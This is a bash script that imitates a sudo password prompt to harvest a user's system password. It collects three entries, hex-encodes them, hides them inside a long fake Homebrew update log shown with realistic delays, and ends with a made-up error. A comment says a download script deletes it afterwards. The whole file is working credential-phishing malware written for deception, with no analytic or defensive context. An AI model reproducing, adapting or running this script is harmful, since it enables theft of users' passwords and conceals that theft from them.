#!/bin/bash

list=()
int=1

while [ $int -le 3 ]
do

    read -sp "[sudo] password for $USER: " pwd
    echo ""

    if [ ${#pwd} -ge 4 ]; then
        ((int++))
    fi

    sleep $(awk 'BEGIN{srand(); print 0.4 + rand() * 1}')

    if [ $int -le 3 ]; then
        echo "Sorry, try again."
    fi

    list+=("$pwd")
done

# encore pwd into something
s=""
for entry in "${list[@]}"
do
    hex_value=$(echo -n "$entry" | xxd -p)

    s+="${hex_value}|"
done


# fake alot of stuff
# echo "Updating Homebrew...
# ==> Tapping homebrew/core
# Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core'...
# remote: Enumerating objects: 1728394, done.
# remote: Counting objects: 100% (1728394/1728394), done.
# remote: Compressing objects: 100% (459823/459823), done.
# remote: Total 1728394 (delta 1268491), reused 1728394 (delta 1268491)
# Receiving objects: 100% (1728394/1728394), 712.29 MiB | 15.22 MiB/s, done.
# Resolving deltas: 100% (1268491/1268491), done.
# Tapped 1 command and 6578 formulae (6,920 files, 793.9MB).
# ==> Tapping homebrew/cask
# Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask'...
# $s
# remote: Enumerating objects: 759234, done.
# remote: Counting objects: 100% (759234/759234), done.
# remote: Compressing objects: 100% (234512/234512), done.
# remote: Total 759234 (delta 524671), reused 759234 (delta 524671)
# Receiving objects: 100% (759234/759234), 310.55 MiB | 14.88 MiB/s, done.
# Resolving deltas: 100% (524671/524671), done.
# Tapped 1 command and 4123 casks (4,298 files, 344.9MB).
# ==> Updated 2 taps (homebrew/core and homebrew/cask).
# ==> New Formulae
# asciinema           ghc@9.4             libpqxx@7.7         paket
# clj-kondo           gitlab-ci-local     libstrophe          pgformatter
# deno                hadolint            libwebsockets       pyright
# gdal                helmfile            marked              shellcheck
# ghc                 hugo                mtr                 typescript
# ==> Updated Formulae
# updated 347 formulae.
# ==> Renamed Formulae
# libpqxx -> libpqxx@7.8
# ==> Deleted Formulae
# libpq
# [Error] an error has occurred while updating homebrew -47817."



#
read -r -d '' brew_output <<EOF
Updating Homebrew...
==> Tapping homebrew/core
Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core'...
remote: Enumerating objects: 1728394, done.
remote: Counting objects: 100% (1728394/1728394), done.
remote: Compressing objects: 100% (459823/459823), done.
remote: Total 1728394 (delta 1268491), reused 1728394 (delta 1268491)
Receiving objects: 100% (1728394/1728394), 712.29 MiB | 15.22 MiB/s, done.
Resolving deltas: 100% (1268491/1268491), done.
Tapped 1 command and 6578 formulae (6,920 files, 793.9MB).
==> Tapping homebrew/cask
Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask'...
$s
remote: Enumerating objects: 759234, done.
remote: Counting objects: 100% (759234/759234), done.
remote: Compressing objects: 100% (234512/234512), done.
remote: Total 759234 (delta 524671), reused 759234 (delta 524671)
Receiving objects: 100% (759234/759234), 310.55 MiB | 14.88 MiB/s, done.
Resolving deltas: 100% (524671/524671), done.
Tapped 1 command and 4123 casks (4,298 files, 344.9MB).
==> Updated 2 taps (homebrew/core and homebrew/cask).
==> New Formulae
asciinema           ghc@9.4             libpqxx@7.7         paket
clj-kondo           gitlab-ci-local     libstrophe          pgformatter
deno                hadolint            libwebsockets       pyright
gdal                helmfile            marked              shellcheck
ghc                 hugo                mtr                 typescript
==> Updated Formulae
updated 347 formulae.
==> Renamed Formulae
libpqxx -> libpqxx@7.8
==> Deleted Formulae
libpq
[Error] an error has occurred while updating homebrew -47817.
EOF

# Read the multi-line string line by line
while IFS= read -r line; do
  # Print the current line
  echo "$line"
  
  # Pause for a very short, random duration to make it look realistic
  sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
done <<< "$brew_output"

# deletes itself (in the downlaod script)